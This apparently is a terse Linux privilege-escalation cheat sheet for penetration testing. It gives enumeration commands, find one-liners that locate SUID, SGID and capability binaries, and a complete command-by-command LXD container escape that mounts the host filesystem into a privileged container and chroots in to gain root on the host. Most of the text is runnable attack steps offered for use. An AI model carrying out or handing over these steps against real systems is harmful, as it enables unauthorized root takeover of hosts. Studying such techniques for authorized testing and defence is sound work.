- `whoami` - what user are we running as
- `id` - what groups does our user belong to?
- `hostname` - what is the server named, can we gather anything from the naming convention?
- `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?
- `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.
#### "File magic"
Capabilities : 
```shell
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Sudo perms abuse :
```shell
sudo -l
```

SETUID bit set : (run as user who created the file)
```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

SETGID bit set : (run as group that created the file)
```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
>> GTFOBins

#### LXD container escape (root on host)
Check if you're in the **lxd group** (you can create/manage containers):
```shell
id
```

Import Alpine image:
```shell
lxc image import ./alpine-*.tar.gz --alias alp-pwn
```


Create a privileged container:
```shell
lxc init alp-pwn privesc -c security.privileged=true
```

Mount host filesystem to container:
```shell
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Start the container:
```shell
lxc start privesc
```

Get shell inside container:
```shell
lxc exec privesc /bin/ash
```

Chroot into host root:
```shell
chroot /mnt/root
```

You’re now root on host.

Notes:
- `security.privileged=true` gives container near-root capabilities on host
- `recursive=true` lets you mount the full `/`
- Use `ash` not `bash` (Alpine thing)
- If `chroot` fails: look for SUID binaries or drop a root shell

